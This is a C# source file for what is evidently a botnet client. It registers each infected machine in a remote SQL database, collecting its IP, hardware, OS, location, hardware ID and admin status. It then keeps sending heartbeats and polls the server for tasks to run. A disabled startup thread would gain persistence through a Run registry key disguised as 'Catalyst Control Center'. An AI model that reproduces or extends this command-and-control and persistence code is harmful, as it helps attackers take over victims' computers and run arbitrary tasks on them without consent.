using Bot.Classes;
using Microsoft.Win32;
using System;
using System.Data.SqlClient;
using System.Threading;

namespace Bot
{
    internal static class Program
    {
        private static void Main()
        {
            if (Misc.Registered())
            {
                //Thread S = new Thread(new ThreadStart(startupThread));
                //S.Start();
                Thread M = new Thread(new ThreadStart(mainThread));
                M.Start();
                Thread U = new Thread(new ThreadStart(updateThread));
                U.Start();
                Thread T = new Thread(new ThreadStart(TaskThread));
                T.Start();
            }
            else
            {
                if (Register())
                {
                    //Thread S = new Thread(new ThreadStart(startupThread));
                    //S.Start();
                    Thread M = new Thread(new ThreadStart(mainThread));
                    M.Start();
                    Thread U = new Thread(new ThreadStart(updateThread));
                    U.Start();
                    Thread T = new Thread(new ThreadStart(TaskThread));
                    T.Start();
                }
                else { }
            }
        }

        private static void startupThread()
        {
            do
            {
                try
                {
                    if (!Misc.getKey("Catalyst Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getFileLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { }
                Thread.Sleep(3000);
            } while (true);
        }

        private static void updateThread()
        {
            do
            {
                using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                {
                    conn.Open();
                    using (SqlCommand cmd = new SqlCommand("UPDATE bots set PCName = @PCName, IP = @IP,CPU = @CPU, GPU = @GPU, OperatingSystem = @OperatingSystem, Country = @Country, Region = @Region, AntiVirus = @AntiVirus, Version = @Version, Admin = @Admin where HWID = @HWID", conn))
                    {
                        cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
                        cmd.Parameters.AddWithValue("IP", Identification.getIP());
                        cmd.Parameters.AddWithValue("CPU", Identification.getCPU());
                        cmd.Parameters.AddWithValue("GPU", Identification.getGPU());
                        cmd.Parameters.AddWithValue("OperatingSystem", Identification.getOS());
                        cmd.Parameters.AddWithValue("Country", Identification.getCountry());
                        cmd.Parameters.AddWithValue("Region", Identification.getRegion());
                        cmd.Parameters.AddWithValue("AntiVirus", "none");
                        cmd.Parameters.AddWithValue("Version", Settings.Botv);
                        cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());

                        cmd.ExecuteNonQuery();
                        cmd.Parameters.Clear();
                    }
                }
                Thread.Sleep(Settings.reqInterval * 60000);
            } while (true);
        }

        private static void mainThread()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                do
                {
                    try
                    {
                        using (SqlCommand cmd = new SqlCommand("UPDATE bots set LastConn = @LastConn where HWID = @HWID", conn))
                        {
                            cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                            cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
                            cmd.ExecuteNonQuery();
                        }
                    }
                    catch { }
                    Thread.Sleep(Settings.reqInterval * 1000);
                } while (true);
            }
        }

        private static void TaskThread()
        {
            string CTaskString = "0";
            do
            {
                using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                {
                    conn.Open();
                    string[] CTask = CTaskString.Split(';');
                    string last = "";
                    for (int i = 1; i < Misc.getTaskID().Length; i++)
                    {
                        for (int n = 0; n < CTask.Length; n++)
                        {
                            if (Misc.getTaskAmount() >= CTask.Length)
                            {
                                if(Convert.ToInt32(CTask[n]) != Misc.getTaskID()[i] && i >= CTask.Length && Misc.getTask(i) != last)
                                {
                                    CTaskString += ";" + Misc.getTaskID()[i];
                                    last = Misc.getTask(i);
                                    Misc.Task(Misc.getTask(i));
                                }
                            }
                        }
                    }
                }
                Thread.Sleep(1000);
            } while (true);
        }

        private static bool Register()
        {
            try
            {
                using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                {
                    conn.Open();
                    using (SqlCommand cmd = new SqlCommand("INSERT into Bots values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Admin, @Active, @TaskAmount)", conn))
                    {
                        cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
                        cmd.Parameters.AddWithValue("IP", Identification.getIP());
                        cmd.Parameters.AddWithValue("CPU", Identification.getCPU());
                        cmd.Parameters.AddWithValue("GPU", Identification.getGPU());
                        cmd.Parameters.AddWithValue("FirstConn", Misc.getDate());
                        cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
                        cmd.Parameters.AddWithValue("OperatingSystem", Identification.getOS());
                        cmd.Parameters.AddWithValue("Country", Identification.getCountry());
                        cmd.Parameters.AddWithValue("Region", Identification.getRegion());
                        cmd.Parameters.AddWithValue("AntiVirus", "none");
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                        cmd.Parameters.AddWithValue("Version", Settings.Botv);
                        cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
                        cmd.Parameters.AddWithValue("Active", Settings.Active);
                        cmd.Parameters.AddWithValue("TaskAmount", Settings.TaskAmount);

                        cmd.ExecuteNonQuery();
                        cmd.Parameters.Clear();
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
